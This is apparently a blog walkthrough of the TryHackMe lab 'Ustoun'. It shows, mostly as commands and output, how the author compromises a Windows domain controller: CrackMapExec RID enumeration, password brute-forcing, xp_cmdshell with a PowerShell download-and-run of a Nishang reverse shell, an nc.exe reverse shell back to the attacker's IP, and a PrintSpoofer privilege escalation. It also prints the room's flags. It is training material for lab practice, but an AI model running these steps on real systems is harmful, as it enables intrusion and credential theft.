---
title: "Walk-through of Ustoun from TryHackMe"
header:
  teaser: /assets/images/2021-05-23-22-24-02.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Windows
  - CrackMapExec
  - PrintSpoofer
  - Impacket
---

## Machine Information

![ustoun](/assets/images/2021-05-23-22-24-02.png)

Ustoun is a medium difficulty room on TryHackMe. An initial scan reveals a Windows Domain Controller with many open ports, but SQL on 1433 stands out. We use CrackMapExec to enumerate the domain controller, find a service account and crack its password. We then use an Impacket script to perform remote code execution to gain a reverse shell. From there we discover an exploit that allows us to escalate our privileges to system level.

<!--more-->

Skills required are basic file and operating system exploration knowledge. Skills gained are using tools to gain a foothold on a Windows server.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Easy - Ustoun](https://tryhackme.com/room/ustoun) |
| Machine Release Date | 1st Feb 2021 |
| Date I Completed It | 23rd May 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/thm/ustoun]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.13.199 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
                                                                                                                    
┌──(root💀kali)-[~/thm/ustoun]
└─# nmap -p$ports -sC -sV -oA ustoun 10.10.13.199

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 16:48 BST
Nmap scan report for 10.10.13.199
Host is up (0.078s latency).

PORT      STATE  SERVICE        VERSION
53/tcp    open   domain         Simple DNS Plus
88/tcp    open   kerberos-sec   Microsoft Windows Kerberos (server time: 2021-04-16 15:48:20Z)
135/tcp   open   msrpc          Microsoft Windows RPC
139/tcp   open   netbios-ssn    Microsoft Windows netbios-ssn
389/tcp   open   ldap           Microsoft Windows Active Directory LDAP (Domain: ustoun.local0., Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http     Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
1433/tcp  open   ms-sql-s?
3268/tcp  open   ldap           Microsoft Windows Active Directory LDAP (Domain: ustoun.local0., Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
3389/tcp  open   ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: DC01
|   NetBIOS_Domain_Name: DC01
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: ustoun.local
|   DNS_Computer_Name: DC.ustoun.local
|   DNS_Tree_Name: ustoun.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-04-16T15:50:58+00:00
| ssl-cert: Subject: commonName=DC.ustoun.local
| Not valid before: 2021-01-31T19:39:34
|_Not valid after:  2021-08-02T19:39:34
|_ssl-date: 2021-04-16T15:51:42+00:00; +1s from scanner time.
5486/tcp  closed unknown
5985/tcp  open   http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open   mc-nmf         .NET Message Framing
47001/tcp open   http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc          Microsoft Windows RPC
49665/tcp open   msrpc          Microsoft Windows RPC
49666/tcp open   msrpc          Microsoft Windows RPC
49668/tcp open   msrpc          Microsoft Windows RPC
49669/tcp open   ncacn_http     Microsoft Windows RPC over HTTP 1.0
49670/tcp open   msrpc          Microsoft Windows RPC
49673/tcp open   msrpc          Microsoft Windows RPC
49685/tcp open   msrpc          Microsoft Windows RPC
49696/tcp open   msrpc          Microsoft Windows RPC
49697/tcp open   msrpc          Microsoft Windows RPC
49705/tcp open   msrpc          Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-04-16T15:51:00
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 301.08 seconds
```

We see from scan there are a lot of open ports, and that the hostname is ustoun.local, let's add that to our hosts file:

```text
┌──(root💀kali)-[~/thm/ustoun]
└─# echo 10.10.13.199 ustoun.local >> /etc/hosts
```

I notice there is SQL on port 1433, which seems unusual for a domain controller. Let's try and gather more information about that:

```text
┌──(root💀kali)-[~/thm/ustoun]
└─# nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 ustoun.local
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-17 16:59 BST
Nmap scan report for ustoun.local (10.10.13.199)
Host is up (0.031s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s

Host script results:
| ms-sql-info: 
|   10.10.13.199:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

Nmap done: 1 IP address (1 host up) scanned in 7.28 seconds
```

## CrackMapExec

We know this server is a Windows Domain Controller, with SQL 2019 installed. Let's start with the usual tools for this scenario. First CME:

```text
┌──(root💀kali)-[~/thm/ustoun]
└─# crackmapexec smb ustoun.local -u "pencer" -p "" --rid-brute
SMB         10.10.69.80     445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:ustoun.local) (signing:True) (SMBv1:False)
SMB         10.10.69.80     445    DC               [+] ustoun.local\pencer: 
SMB         10.10.69.80     445    DC               [+] Brute forcing RIDs
SMB         10.10.69.80     445    DC               498: DC01\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.69.80     445    DC               500: DC01\Administrator (SidTypeUser)
SMB         10.10.69.80     445    DC               501: DC01\Guest (SidTypeUser)
SMB         10.10.69.80     445    DC               502: DC01\krbtgt (SidTypeUser)
SMB         10.10.69.80     445    DC               512: DC01\Domain Admins (SidTypeGroup)
SMB         10.10.69.80     445    DC               513: DC01\Domain Users (SidTypeGroup)
SMB         10.10.69.80     445    DC               514: DC01\Domain Guests (SidTypeGroup)
SMB         10.10.69.80     445    DC               515: DC01\Domain Computers (SidTypeGroup)
SMB         10.10.69.80     445    DC               516: DC01\Domain Controllers (SidTypeGroup)
SMB         10.10.69.80     445    DC               517: DC01\Cert Publishers (SidTypeAlias)
SMB         10.10.69.80     445    DC               518: DC01\Schema Admins (SidTypeGroup)
SMB         10.10.69.80     445    DC               519: DC01\Enterprise Admins (SidTypeGroup)
SMB         10.10.69.80     445    DC               520: DC01\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.69.80     445    DC               521: DC01\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.69.80     445    DC               522: DC01\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.69.80     445    DC               525: DC01\Protected Users (SidTypeGroup)
SMB         10.10.69.80     445    DC               526: DC01\Key Admins (SidTypeGroup)
SMB         10.10.69.80     445    DC               527: DC01\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.69.80     445    DC               553: DC01\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.69.80     445    DC               571: DC01\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.69.80     445    DC               572: DC01\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.69.80     445    DC               1000: DC01\DC$ (SidTypeUser)
SMB         10.10.69.80     445    DC               1101: DC01\DnsAdmins (SidTypeAlias)
SMB         10.10.69.80     445    DC               1102: DC01\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.69.80     445    DC               1112: DC01\SVC-Kerb (SidTypeUser)
SMB         10.10.69.80     445    DC               1114: DC01\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
```

We get a list of SIDs from the DC. Anything above 1000 is interesting as they are not default or builtin, see [this](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab) Microsoft article for some information.

From above we see a user called SVC-Kerb, which sounds suspiciously like a service account. Let's try and find it's password:

```text
┌──(root💀kali)-[~/thm/ustoun]
└─# crackmapexec smb ustoun.local -u "SVC-Kerb" -p /usr/share/wordlists/rockyou.txt 
SMB         10.10.69.80     445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:ustoun.local) (signing:True) (SMBv1:False)
SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:i<3ruby STATUS_LOGON_FAILURE 
SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:123456 STATUS_LOGON_FAILURE 
SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:12345 STATUS_LOGON_FAILURE 
<SNIP>
SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:123123 STATUS_LOGON_FAILURE 
SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:football STATUS_LOGON_FAILURE 
SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:secret STATUS_LOGON_FAILURE 
SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:andrea STATUS_LOGON_FAILURE 
SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:carlos STATUS_LOGON_FAILURE 
SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:jennifer STATUS_LOGON_FAILURE 
SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:joshua STATUS_LOGON_FAILURE 
SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:bubbles STATUS_LOGON_FAILURE 
SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:1234567890 STATUS_LOGON_FAILURE 
SMB         10.10.69.80     445    DC               [+] ustoun.local\SVC-Kerb:superman
```

## Impacket MSSQLClient

CrackMapExec has found the service accounts password. Let's use those credentials and attempt to login to SQL using Impackets client script that gives us a basic shell:

```text
┌──(root💀kali)-[~/thm/ustoun]
└─# mssqlclient.py SVC-Kerb@ustoun.local
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC): Line 1: Changed database context to 'master'.
[*] INFO(DC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

Let's see if we can use xp_cmdshell to execute something on the server:

```text
SQL> xp_cmdshell whoami
dc01\svc-kerb                                                                      
```

That worked. Let's try to get a reverse shell. I found [this](https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell) article that helped.

First start a webserver:

```text
┌──(root💀kali)-[~/thm/ustoun]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Get the Nishang reverse shell from [here](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1). Edit it and put this at end:

```text
Invoke-PowerShellTcp -Reverse -IPAddress 10.8.165.116 -Port 1337
```

Start netcat listening on port 1337 waiting to catch our shell:

```text
┌──(root💀kali)-[~/thm/ustoun]
└─# nc -nlvp 1337
listening on [any] 1337 ...
```

## Nishang Reverse Shell

Now go back to our SQL session and use it to call our reverse shell:

```text
SQL> xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://10.8.165.116/Invoke-PowerShellTcp.ps1\")
```

Switch back to our nc listener to see we are connected:

```text
┌──(root💀kali)-[~/thm/ustoun]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.13.199] 50190
Windows PowerShell running as user SVC-Kerb on DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
PS C:\Windows\system32>
```

Let's check who are and our permissions:

```text
PS C:\Windows\system32>whoami
dc01\svc-kerb

PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\Windows\system32> 
```

We have SeImpersonatePrivilege which allows us to escalate privileges by abusing tokens. Hacktricks has some good information about this [here](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens). It mentions a few exploits, I've used PrintSpoofer before on another THM room called [Relevant](https://pencer.io/ctf/ctf-thm-relevant/) so I went with that.

## PrintSpoofer

Switch to Kali and grab the PrintSpoofer binary:

```text
┌──(root💀kali)-[~/thm/ustoun]
└─# wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
--2021-05-23 21:35:38--  https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github-releases.githubusercontent.com/259576481/82057700-f39e-11ea-90a9-983c4000cbf3?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210523%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210523T203536Z&X-Amz-Expires=300&X-Amz-Signature=8347c16e4cefff6cdaf990b339cad88b8a2d7f2ee734d628bc35be37a94bddbf&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=259576481&response-content-disposition=attachment%3B%20filename%3DPrintSpoofer32.exe&response-content-type=application%2Foctet-stream [following]
--2021-05-23 21:35:38--  https://github-releases.githubusercontent.com/259576481/82057700-f39e-11ea-90a9-983c4000cbf3?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210523%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210523T203536Z&X-Amz-Expires=300&X-Amz-Signature=8347c16e4cefff6cdaf990b339cad88b8a2d7f2ee734d628bc35be37a94bddbf&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=259576481&response-content-disposition=attachment%3B%20filename%3DPrintSpoofer32.exe&response-content-type=application%2Foctet-stream
Resolving github-releases.githubusercontent.com (github-releases.githubusercontent.com)... 185.199.109.154, 185.199.110.154, 185.199.108.154, ...
Connecting to github-releases.githubusercontent.com (github-releases.githubusercontent.com)|185.199.109.154|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22016 (22K) [application/octet-stream]
Saving to: ‘PrintSpoofer32.exe’
PrintSpoofer32.exe                                          100%[=========================================================>]  21.50K  --.-KB/s    in 0.006s  
2021-05-23 21:35:38 (3.56 MB/s) - ‘PrintSpoofer32.exe’ saved [22016/22016]
```

Now back on the Windows server, first check where we are:

```text
PS C:\Windows\system32> dir c:\users

    Directory: C:\users

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         2/1/2021  11:03 AM                Administrator                                                         
d-r---        1/30/2021   9:15 AM                Public                                                                
d-----         2/1/2021   8:25 AM                SVC-Kerb.DC01    
```

We already have a webserver running on Kali, so use certutil here to pull the file across:

```text
PS C:\Windows\system32> certutil -urlcache -f http://10.8.165.116/PrintSpoofer32.exe c:\users\svc-kerb.dc01\PrintSpoofer.exe
```

## NetCat Reverse Shell

I couldn't get the exploit to run from within my Nishang reverse shell. So I decided to switch a netcat shell instead. Find one already available in Kali:

```text
┌──(root💀kali)-[~/thm/ustoun]
└─# locate nc.exe
/root/thm/wreath/nc.exe
/usr/share/windows-resources/binaries/nc.exe
```

Close my current Nishang shell, go back to SQL and upload nc.exe:

```text
SQL> xp_cmdshell certutil -urlcache -f http://10.8.165.116/nc.exe c:\users\svc-kerb.dc01\nc.exe
output
--------------------------------------------------------------------------------
****  Online  ****                                                                 
CertUtil: -URLCache command completed successfully.                                
NULL                                                                               
```

Start a netcat listener on Kali, then connect to it from the server:

```text
SQL> xp_cmdshell c:\users\svc-kerb.dc01\nc.exe -e cmd 10.8.165.116 443
```

Now switch to our netcat session to see we are connected:

```text
┌──(root💀kali)-[~/thm/ustoun]
└─# nc -nlvp 443
listening on [any] 443 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.79.18] 50134
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
```

Now change directory and execute the exploit:

```text
C:\Windows\system32>cd ..\..\users\svc-kerb.dc01
c:\users\svc-kerb.dc01>printspoofer.exe -i -c powershell
printspoofer.exe -i -c powershell
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.
```

It worked this time, let's check our permissions:

```text
PS C:\Windows\system32> whoami
whoami
dc01\dc$
```

## Privilege Escalation

Nice. We now have system level rights so can grab the flags:

```text
PS C:\Windows\system32> dir c:\users\svc-kerb.dc01\desktop
dir c:\users\svc-kerb.dc01\desktop
    Directory: C:\users\svc-kerb.dc01\desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/30/2021   9:21 PM             42 user.txt
PS C:\Windows\system32> type c:\users\svc-kerb.dc01\desktop\user.txt
type c:\users\svc-kerb.dc01\desktop\user.txt
THM{MSSQL_IS_COOL}

PS C:\Windows\system32> dir c:\users\administrator\desktop
dir c:\users\administrator\desktop
    Directory: C:\users\administrator\desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/1/2021  10:48 AM             19 flag.txt
PS C:\Windows\system32> type c:\users\administrator\desktop\flag.txt
type c:\users\administrator\desktop\flag.txt
THM{I_L1kE_gPoS}
```

All Done. See you next time.
